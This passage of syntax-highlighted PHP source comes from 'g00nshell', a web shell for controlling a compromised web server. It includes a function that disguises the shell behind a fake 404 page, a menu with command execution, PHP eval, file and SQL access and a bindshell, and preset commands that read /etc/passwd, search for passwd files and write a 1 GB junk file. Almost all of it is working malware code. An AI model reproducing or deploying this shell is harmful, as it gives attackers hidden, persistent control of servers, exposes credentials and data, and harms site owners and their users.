<span class="lineno">324</span>   <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;////&quot;</span><span class="p">,</span> <span class="s2">&quot;//&quot;</span><span class="p">,</span> <span class="nv">$d</span><span class="p">);</span>
<span class="lineno">325</span>   <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span> <span class="nv">$d</span><span class="p">);</span>
<span class="lineno">326</span>   <span class="k">return</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">327</span> <span class="p">}</span>
<span class="lineno">328</span> <span class="k">function</span> <span class="nf">hide</span><span class="p">(){</span> <span class="c1">// Hiding function</span>
<span class="lineno">329</span>   <span class="k">global</span> <span class="nv">$self</span><span class="p">,</span> <span class="nv">$soft</span><span class="p">,</span> <span class="nv">$servip</span><span class="p">,</span> <span class="nv">$servport</span><span class="p">;</span>
<span class="lineno">330</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;!DOCTYPE HTML PUBLIC &#39;-//IETF//DTD HTML 2.0//EN&#39;&gt;</span>
<span class="lineno">331</span> <span class="s2">&lt;HTML&gt;&lt;HEAD&gt;</span>
<span class="lineno">332</span> <span class="s2">&lt;TITLE&gt;404 Not Found&lt;/TITLE&gt;</span>
<span class="lineno">333</span> <span class="s2">&lt;/HEAD&gt;&lt;BODY&gt;</span>
<span class="lineno">334</span> <span class="s2">&lt;H1&gt;Not Found&lt;/H1&gt;</span>
<span class="lineno">335</span> <span class="s2">The requested URL </span><span class="si">$self</span><span class="s2"> was not found on this server.&lt;P&gt;</span>
<span class="lineno">336</span> <span class="s2">&lt;P&gt;Additionally, a 404 Not Found</span>
<span class="lineno">337</span> <span class="s2">error was encountered while trying to use an ErrorDocument to handle the request.</span>
<span class="lineno">338</span> <span class="s2">&lt;HR&gt;</span>
<span class="lineno">339</span> <span class="s2">&lt;ADDRESS&gt;</span><span class="si">$soft</span><span class="s2"> Server at </span><span class="si">$servip</span><span class="s2"> Port </span><span class="si">$servport</span><span class="s2">&lt;/ADDRESS&gt;</span>
<span class="lineno">340</span> <span class="s2">&lt;/BODY&gt;&lt;/HTML&gt;&quot;</span><span class="p">);</span>
<span class="lineno">341</span> <span class="p">}</span>
<span class="lineno">342</span> <span class="k">function</span> <span class="nf">style</span><span class="p">(){</span> <span class="c1">// Style / header function</span>
<span class="lineno">343</span>   <span class="k">global</span> <span class="nv">$servip</span><span class="p">,</span><span class="nv">$version</span><span class="p">;</span>
<span class="lineno">344</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;html&gt;</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">345</span> <span class="s2">  &lt;head&gt;</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">346</span> <span class="s2">  &lt;title&gt;g00nshell v&quot;</span> <span class="o">.</span> <span class="nv">$version</span> <span class="o">.</span> <span class="s2">&quot; - &quot;</span> <span class="o">.</span> <span class="nv">$servip</span> <span class="o">.</span> <span class="s2">&quot;&lt;/title&gt;</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">347</span> <span class="s2">  &lt;style&gt;</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">348</span> <span class="s2">  body { background-color:#000000; color:white; font-family:Verdana; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">349</span> <span class="s2">  h1 { color:white; font-family:Verdana; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">350</span> <span class="s2">  h3 { color:white; font-family:Verdana; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">351</span> <span class="s2">  input,textarea,select { color:#FFFFFF; background-color:#2F2F2F; border:1px solid #4F4F4F; font-family:Verdana; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">352</span> <span class="s2">  textarea { font-family:Courier; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">353</span> <span class="s2">  a { color:#6F6F6F; text-decoration:none; font-family:Verdana; font-size:11px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">354</span> <span class="s2">  a:hover { color:#7F7F7F; }</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">355</span> <span class="s2">  td,th { font-size:12px; vertical-align:middle; }</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">356</span> <span class="s2">  th { font-size:13px; }</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">357</span> <span class="s2">  table { empty-cells:show;}</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">358</span> <span class="s2">  .inf { color:#7F7F7F; }</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">359</span> <span class="s2">  &lt;/style&gt;</span><span class="se">\n</span><span class="s2"></span>
<span class="lineno">360</span> <span class="s2">  &lt;/head&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">361</span> <span class="p">}</span>
<span class="lineno">362</span> <span class="k">function</span> <span class="nf">main</span><span class="p">(){</span> <span class="c1">// Main/menu function</span>
<span class="lineno">363</span>   <span class="k">global</span> <span class="nv">$self</span><span class="p">,</span> <span class="nv">$servip</span><span class="p">,</span> <span class="nv">$servport</span><span class="p">,</span> <span class="nv">$uname</span><span class="p">,</span> <span class="nv">$soft</span><span class="p">,</span> <span class="nv">$banner</span><span class="p">,</span> <span class="nv">$curuser</span><span class="p">,</span> <span class="nv">$version</span><span class="p">;</span>
<span class="lineno">364</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">365</span>   <span class="nv">$act</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Command Execute&#39;</span><span class="p">,</span><span class="s1">&#39;files&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;File View&#39;</span><span class="p">,</span><span class="s1">&#39;phpinfo&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;PHP info&#39;</span><span class="p">,</span> <span class="s1">&#39;phpexec&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;PHP Execute&#39;</span><span class="p">,</span>
<span class="lineno">366</span>   <span class="s1">&#39;tools&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Tools&#39;</span><span class="p">,</span><span class="s1">&#39;sqllogin&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;SQL&#39;</span><span class="p">,</span><span class="s1">&#39;email&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Email&#39;</span><span class="p">,</span><span class="s1">&#39;upload&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Get Files&#39;</span><span class="p">,</span><span class="s1">&#39;lookup&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;List Domains&#39;</span><span class="p">,</span><span class="s1">&#39;bshell&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Bindshell&#39;</span><span class="p">,</span><span class="s1">&#39;kill&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;Kill Shell&#39;</span><span class="p">);</span>
<span class="lineno">367</span>   <span class="nv">$capt</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$act</span><span class="p">);</span>
<span class="lineno">368</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;form method=&#39;GET&#39; name=&#39;shell&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">369</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Host:&lt;/b&gt; &lt;span class=&#39;inf&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$servip</span> <span class="o">.</span> <span class="s2">&quot;&lt;/span&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">370</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Server software:&lt;/b&gt; &lt;span class=&#39;inf&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$soft</span> <span class="o">.</span> <span class="s2">&quot;&lt;/span&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">371</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Uname:&lt;/b&gt; &lt;span class=&#39;inf&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$uname</span> <span class="o">.</span> <span class="s2">&quot;&lt;/span&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">372</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Shell Directory:&lt;/b&gt; &lt;span class=&#39;inf&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nb">getcwd</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;&lt;/span&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">373</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;div style=&#39;display:none&#39; id=&#39;info&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">374</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Current User:&lt;/b&gt; &lt;span class=&#39;inf&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$curuser</span> <span class="o">.</span> <span class="s2">&quot;&lt;/span&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">375</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;ID:&lt;/b&gt; &lt;span class=&#39;inf&#39;&gt;&quot;</span> <span class="o">.</span> <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/span&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">376</span>   <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Safemode:&lt;/b&gt; &lt;font color=&#39;red&#39;&gt;ON&lt;/font&gt;&quot;</span><span class="p">);}</span>
<span class="lineno">377</span>   <span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Safemode:&lt;/b&gt; &lt;font color=&#39;green&#39;&gt;OFF&lt;/font&gt;&quot;</span><span class="p">);}</span>
<span class="lineno">378</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">379</span>   <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Open Base Dir:&lt;/b&gt; &lt;font color=&#39;red&#39;&gt;ON&lt;/font&gt; [ &lt;span class=&#39;inf&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/span&gt; ]&quot;</span><span class="p">);}</span>
<span class="lineno">380</span>   <span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Open Base Dir:&lt;/b&gt; &lt;font color=&#39;green&#39;&gt;OFF&lt;/font&gt;&quot;</span><span class="p">);}</span>
<span class="lineno">381</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">382</span>   <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Disabled functions:&lt;/b&gt; &quot;</span> <span class="o">.</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">));}</span>
<span class="lineno">383</span>   <span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Disabled functions:&lt;/b&gt; None&quot;</span><span class="p">);}</span>
<span class="lineno">384</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">385</span>   <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">mysql_connect</span><span class="p">)){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;MySQL:&lt;/b&gt; &lt;font color=&#39;green&#39;&gt;ON&lt;/font&gt;&quot;</span><span class="p">);}</span>
<span class="lineno">386</span>   <span class="k">else</span><span class="p">{</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;MySQL:&lt;/b&gt; &lt;font color=&#39;red&#39;&gt;OFF&lt;/font&gt;&quot;</span><span class="p">);}</span>
<span class="lineno">387</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">);</span>
<span class="lineno">388</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[ &lt;a href=&#39;#hax&#39; onClick=</span><span class="se">\&quot;</span><span class="s2">document.getElementById(&#39;info&#39;).style.display = &#39;block&#39;;</span><span class="se">\&quot;</span><span class="s2">&gt;More&lt;/a&gt; ] &quot;</span><span class="p">);</span>
<span class="lineno">389</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[ &lt;a href=&#39;#hax&#39; onClick=</span><span class="se">\&quot;</span><span class="s2">document.getElementById(&#39;info&#39;).style.display = &#39;none&#39;;</span><span class="se">\&quot;</span><span class="s2">&gt;Less&lt;/a&gt; ]&quot;</span><span class="p">);</span>
<span class="lineno">390</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;center&gt;&quot;</span><span class="p">);</span>
<span class="lineno">391</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;h3 align=&#39;center&#39;&gt;Links&lt;/h3&gt;&quot;</span><span class="p">);</span>
<span class="lineno">392</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]){</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$act</span> <span class="k">as</span> <span class="nv">$link</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[ &lt;a href=&#39;?&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;act=&quot;</span> <span class="o">.</span> <span class="nv">$capt</span><span class="p">[</span><span class="nv">$link</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39; target=&#39;frm&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&lt;/a&gt; ] &quot;</span><span class="p">);}}</span>
<span class="lineno">393</span>   <span class="k">else</span><span class="p">{</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$act</span> <span class="k">as</span> <span class="nv">$link</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;[ &lt;a href=&#39;?act=&quot;</span> <span class="o">.</span> <span class="nv">$capt</span><span class="p">[</span><span class="nv">$link</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&#39; target=&#39;frm&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&lt;/a&gt; ] &quot;</span><span class="p">);}}</span>
<span class="lineno">394</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/center&gt;&quot;</span><span class="p">);</span>
<span class="lineno">395</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;hr&gt;&quot;</span><span class="p">);</span>
<span class="lineno">396</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;br&gt;&lt;iframe name=&#39;frm&#39; style=&#39;width:100%; height:65%; border:0;&#39; src=&#39;?act=files&#39;&gt;&lt;/iframe&gt;&quot;</span><span class="p">);</span>
<span class="lineno">397</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;pre style=&#39;text-align:center&#39;&gt;:: g00nshell &lt;font color=&#39;red&#39;&gt;v&quot;</span> <span class="o">.</span> <span class="nv">$version</span> <span class="o">.</span> <span class="s2">&quot;&lt;/font&gt; ::&lt;/pre&gt;&quot;</span><span class="p">);</span>
<span class="lineno">398</span>   <span class="k">die</span><span class="p">();</span>
<span class="lineno">399</span> <span class="p">}</span>
<span class="lineno">400</span> <span class="k">function</span> <span class="nf">cmd</span><span class="p">(){</span> <span class="c1">// Command execution function</span>
<span class="lineno">401</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">402</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;form name=&#39;CMD&#39; method=&#39;POST&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">403</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Command:&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">);</span>
<span class="lineno">404</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input name=&#39;cmd&#39; type=&#39;text&#39; size=&#39;50&#39;&gt; &quot;</span><span class="p">);</span>
<span class="lineno">405</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;select name=&#39;precmd&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">406</span>   <span class="nv">$precmd</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;Read /etc/passwd&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="p">,</span><span class="s1">&#39;Open ports&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;netstat -an&#39;</span><span class="p">,</span>
<span class="lineno">407</span>                   <span class="s1">&#39;Running Processes&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;ps -aux&#39;</span><span class="p">,</span> <span class="s1">&#39;Uname&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;uname -a&#39;</span><span class="p">,</span> <span class="s1">&#39;Get UID&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;id&#39;</span><span class="p">,</span>
<span class="lineno">408</span>                   <span class="s1">&#39;Create Junkfile (/tmp/z)&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;dd if=/dev/zero of=/tmp/z bs=1M count=1024&#39;</span><span class="p">,</span>
<span class="lineno">409</span>                   <span class="s1">&#39;Find passwd files&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;find / -type f -name passwd&#39;</span><span class="p">);</span>
<span class="lineno">410</span>   <span class="nv">$capt</span> <span class="o">=</span> <span class="nb">array_flip</span><span class="p">(</span><span class="nv">$precmd</span><span class="p">);</span>
<span class="lineno">411</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$precmd</span> <span class="k">as</span> <span class="nv">$c</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;option value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$c</span> <span class="o">.</span> <span class="s2">&quot;&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nv">$capt</span><span class="p">[</span><span class="nv">$c</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
<span class="lineno">412</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/select&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">413</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input type=&#39;submit&#39; value=&#39;Execute&#39;&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">414</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/form&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">415</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$x</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];}</span>
<span class="lineno">416</span>   <span class="k">elseif</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;precmd&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$x</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;precmd&#39;</span><span class="p">];}</span>
<span class="lineno">417</span>   <span class="k">else</span><span class="p">{</span><span class="k">die</span><span class="p">();}</span>
<span class="lineno">418</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Results: &lt;br&gt;&lt;textarea rows=20 cols=100&gt;&quot;</span><span class="p">);</span>
<span class="lineno">419</span>   <span class="nv">$cmd</span> <span class="o">=</span> <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span> <span class="nv">$result</span><span class="p">);</span>
<span class="lineno">420</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="nv">$line</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
<span class="lineno">421</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/textarea&gt;&quot;</span><span class="p">);</span>
<span class="lineno">422</span> <span class="p">}</span>
<span class="lineno">423</span> <span class="k">function</span> <span class="nf">execphp</span><span class="p">(){</span> <span class="c1">// PHP code execution function</span>
<span class="lineno">424</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">425</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;h4&gt;Execute PHP Code&lt;/h4&gt;&quot;</span><span class="p">);</span>
<span class="lineno">426</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;form method=&#39;POST&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">427</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;textarea name=&#39;phpexec&#39; rows=5 cols=100&gt;&quot;</span><span class="p">);</span>
<span class="lineno">428</span>   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phpexec&#39;</span><span class="p">]){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;/*Don&#39;t include &lt;? ?&gt; tags*/</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
<span class="lineno">429</span>   <span class="k">echo</span><span class="p">(</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phpexec&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&lt;/textarea&gt;</span><span class="se">\n</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">430</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input type=&#39;submit&#39; value=&#39;Execute&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">431</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/form&gt;&quot;</span><span class="p">);</span>
<span class="lineno">432</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phpexec&#39;</span><span class="p">]){</span>
<span class="lineno">433</span>     <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;textarea rows=10 cols=100&gt;&quot;</span><span class="p">);</span>
<span class="lineno">434</span>     <span class="k">eval</span><span class="p">(</span><span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;phpexec&#39;</span><span class="p">]));</span>
<span class="lineno">435</span>     <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/textarea&gt;&quot;</span><span class="p">);</span>
<span class="lineno">436</span>   <span class="p">}</span>
<span class="lineno">437</span> <span class="p">}</span>
<span class="lineno">438</span> <span class="k">function</span> <span class="nf">sqllogin</span><span class="p">(){</span> <span class="c1">// MySQL login function</span>
<span class="lineno">439</span>   <span class="nb">session_start</span><span class="p">();</span>
<span class="lineno">440</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;isloggedin&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;true&quot;</span><span class="p">){</span>
<span class="lineno">441</span>     <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: ?act=sql&quot;</span><span class="p">);</span>
<span class="lineno">442</span>   <span class="p">}</span>
<span class="lineno">443</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">444</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;form method=&#39;post&#39; action=&#39;?act=sql&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">445</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;User:&lt;br&gt;&lt;input type=&#39;text&#39; name=&#39;un&#39; size=&#39;30&#39;&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">446</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Password:&lt;br&gt;&lt;input type=&#39;text&#39; name=&#39;pw&#39; size=&#39;30&#39;&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">447</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Host:&lt;br&gt;&lt;input type=&#39;text&#39; name=&#39;host&#39; size=&#39;30&#39; value=&#39;localhost&#39;&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">448</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Port:&lt;br&gt;&lt;input type=&#39;text&#39; name=&#39;port&#39; size=&#39;30&#39; value=&#39;3306&#39;&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">449</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;input type=&#39;submit&#39; value=&#39;Login&#39;&gt;&quot;</span><span class="p">);</span>
<span class="lineno">450</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/form&gt;&quot;</span><span class="p">);</span>
<span class="lineno">451</span>   <span class="k">die</span><span class="p">();</span>
<span class="lineno">452</span> <span class="p">}</span>
<span class="lineno">453</span> <span class="k">function</span> <span class="nf">sql</span><span class="p">(){</span> <span class="c1">// General SQL Function</span>
<span class="lineno">454</span>   <span class="nb">session_start</span><span class="p">();</span>
<span class="lineno">455</span>   <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;sqlf&#39;</span><span class="p">]){</span><span class="nx">style</span><span class="p">();}</span>
<span class="lineno">456</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;un&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pw&#39;</span><span class="p">]){;</span>
<span class="lineno">457</span>     <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;un&#39;</span><span class="p">];</span>
<span class="lineno">458</span>     <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_password&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pw&#39;</span><span class="p">];</span>
<span class="lineno">459</span>   <span class="p">}</span>
<span class="lineno">460</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]){</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];}</span>
